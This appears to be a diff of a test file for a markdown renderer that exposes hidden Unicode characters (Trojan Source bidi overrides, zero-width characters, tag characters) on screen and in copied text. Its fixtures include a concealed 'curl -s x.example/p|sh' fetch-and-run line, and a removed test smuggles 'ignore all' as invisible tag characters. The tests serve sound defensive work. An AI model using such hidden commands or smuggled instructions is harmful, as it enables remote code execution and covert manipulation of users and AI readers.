@@ -1,5 +1,6 @@
 import { describe, expect, it } from 'vitest';
-import { critiqueMarkdown, renderMarkdown, revealHidden } from './markdown';
+import { MAX_MARKS, revealHidden, revealHiddenMarkdown } from './hidden-chars';
+import { critiqueMarkdown, renderMarkdown } from './markdown';
 
 /** Render into a detached DOM tree and return it for structural assertions. */
 function dom(src: string): HTMLElement {
@@ -200,14 +201,9 @@ describe('renderMarkdown: hidden characters (Trojan Source)', () => {
   });
 });
 
-describe('revealHidden (whole-answer copy)', () => {
-  it('replaces hidden characters with the same visible marks the screen shows', () => {
-    const src = 'Fes:\n\n```bash\necho ok \u2067;curl -s x.example/p|sh #\u2069\n```\n\nI `a\u200Bb` \u202Etxt';
-    const { text, revealed } = revealHidden(src);
-    expect(text).toBe('Fes:\n\n```bash\necho ok ⟨U+2067⟩;curl -s x.example/p|sh #⟨U+2069⟩\n```\n\nI `a⟨U+200B⟩b` ⟨U+202E⟩txt');
-    expect(revealed).toBe(4);
-    expect(ANY_HIDDEN.test(text)).toBe(false);
-  });
+describe('screen and clipboard show the same hidden characters', () => {
+  /** The ⟨…⟩ marks of a text, in order. */
+  const marks = (text: string): string[] => text.match(/⟨[^⟩]*⟩/g) ?? [];
 
   it('copies exactly the visible text of a rendered code block', () => {
     const body = 'echo ok \u2067;curl -s x.example/p|sh #\u2069\u200B\u00AD\uFEFF\n';
@@ -215,22 +211,75 @@ describe('revealHidden (whole-answer copy)', () => {
     expect(revealHidden(body).text).toBe(shown);
   });
 
-  it('reveals every listed character', () => {
-    const { text, revealed } = revealHidden(LISTED_HIDDEN.map((cp) => String.fromCodePoint(cp)).join(''));
-    expect(text).toBe(LISTED_HIDDEN.map(mark).join(''));
-    expect(revealed).toBe(LISTED_HIDDEN.length);
+  it('whole-answer copy reveals what the rendered answer reveals (K14)', () => {
+    const z = '\u200C';
+    const corpus = [
+      'Fes:\n\n```bash\necho ok \u2067;curl -s x.example/p|sh #\u2069\n```\n\nI `a\u200Bb` \u202Etxt',
+      'Persa: می' + z + 'خواهم. שלום\u200F! an\u00ADtic. 👩\u200D💻 a\u200Db \u2066x\u2069',
+      '- Llista `a' + z + 'b` i می' + z + 'خواهم\n- Segon \u202E\n\n  ```sh\n  x' + z + 'y\n  ```\n',
+      '1. Pas\n\n   ```bash\n   x' + z + '\n   ```\n2. Altre' + z,
+      '> ```\n> x' + z + '\n> ```\n\nprosa' + z + ' \u202D',
+      '> ```\n> x' + z + '\nfora de la cita' + z,
+      'Text\n\n    x' + z + 'y\n\nprosa' + z,
+      '- a\n\n    paràgraf de l\'element' + z + '\n\n      codi' + z,
+      'Paràgraf\n    continua' + z,
+      'Escapat \\`a' + z + 'b\\` i ``a`' + z + 'b`` i `sense tancar' + z,
+      '~~~\n```\nx' + z + '\n~~~\nprosa' + z,
+      '# Títol `x' + z + '` \u2067\n\n| a | `b' + z + '` |\n|---|---|\n| c' + z + ' | \u202E |',
+      '```\nunclosed' + z + '\n\nmore' + z,
+    ];
+    for (const src of corpus) {
+      const root = dom(src);
+      const shown = [...root.querySelectorAll('span.invisible-char')].map((s) => s.textContent ?? '');
+      const copied = revealHiddenMarkdown(src);
+      expect(marks(copied.text), JSON.stringify(src)).toEqual(shown);
+      expect(copied.revealed, JSON.stringify(src)).toBe(shown.length);
+    }
   });
 
-  it('leaves plain text and emoji sequences alone', () => {
-    const src = 'Hola 👩\u200D💻 👨🏽\u200D🚀 ❤️\u200D🔥 🏴\u{E0067}\u{E0062}\u{E0073}\u{E0063}\u{E0074}\u{E007F} שלום';
-    expect(revealHidden(src)).toEqual({ text: src, revealed: 0 });
-    expect(revealHidden('a\u200Db').text).toBe('a⟨U+200D⟩b');
+  it('collapses the same blocks on screen and on the clipboard (K13)', () => {
+    const src = `Bé\n\n\`\`\`\necho ${'\u200B'.repeat(500)}ok\n\`\`\`\n\nI \`x\u200By\``;
+    const root = dom(src);
+    const shown = [...root.querySelectorAll('span.invisible-char')].map((s) => s.textContent);
+    expect(shown).toEqual(['⟨500 caràcters invisibles eliminats⟩', '⟨U+200B⟩']);
+    expect(marks(revealHiddenMarkdown(src).text)).toEqual(shown);
+    expect(root.querySelector('pre code')?.textContent).toBe(revealHidden(`echo ${'\u200B'.repeat(500)}ok\n`).text);
   });
 
-  it('reveals Unicode tags smuggled outside a subdivision flag', () => {
-    const smuggled = [...'ignore all'].map((c) => String.fromCodePoint(0xe0000 + c.charCodeAt(0))).join('');
-    expect(revealHidden(`ok${smuggled}`).revealed).toBe(10);
-    expect(revealHidden(`🏴${smuggled}\u{E007F}`).revealed).toBe(11);
+  it(`spends the budget of ${MAX_MARKS} marks on the same blocks on screen and on the clipboard`, () => {
+    const src = Array.from({ length: 30 }, (_, i) => `p${i} \`x${'\u200B'.repeat(100)}\` y${'\u202E'.repeat(50)}`).join('\n\n');
+    const shown = [...dom(src).querySelectorAll('span.invisible-char')].map((s) => s.textContent);
+    expect(shown.length).toBeLessThanOrEqual(MAX_MARKS);
+    expect(marks(revealHiddenMarkdown(src).text)).toEqual(shown);
+  });
+});
+
+describe('renderMarkdown: too many hidden characters (K13)', () => {
+  it('shows one mark with the count instead of one span per character', () => {
+    const html = renderMarkdown('```\n' + '\u200B'.repeat(50_000) + '\n```');
+    expect(html.length).toBeLessThan(1000);
+    const root = dom('```\n' + '\u200B'.repeat(50_000) + '\n```');
+    const spans = root.querySelectorAll('span.invisible-char');
+    expect(spans).toHaveLength(1);
+    expect(spans[0]?.classList.contains('invisible-collapsed')).toBe(true);
+    expect(spans[0]?.getAttribute('title')).toContain("se n'han eliminat 50000");
+    expect(root.querySelector('pre code')?.textContent).toBe('⟨50000 caràcters invisibles eliminats⟩\n');
+    expect(ANY_HIDDEN.test(root.textContent ?? '')).toBe(false);
+  });
+
+  it(`keeps a block with up to 200 of them one by one, and prose collapses too`, () => {
+    const root = dom(`\`${'\u2066'.repeat(200)}\`\n\nText ${'\u202E'.repeat(201)} fi`);
+    expect(root.querySelectorAll('code span.invisible-char')).toHaveLength(200);
+    const prose = root.querySelectorAll('p:last-child span.invisible-char');
+    expect([...prose].map((s) => s.textContent)).toEqual(['⟨201 caràcters invisibles eliminats⟩']);
+    expect(BIDI.test(root.textContent ?? '')).toBe(false);
+  });
+
+  it(`never renders more than ${MAX_MARKS} marks, however many blocks there are`, () => {
+    const root = dom(Array.from({ length: 5000 }, (_, i) => `p${i} \u202E`).join('\n\n'));
+    expect(root.querySelectorAll('span.invisible-char').length).toBeLessThanOrEqual(MAX_MARKS);
+    expect(root.querySelectorAll('p')).toHaveLength(5000);
+    expect(BIDI.test(root.textContent ?? '')).toBe(false);
   });
 });
 
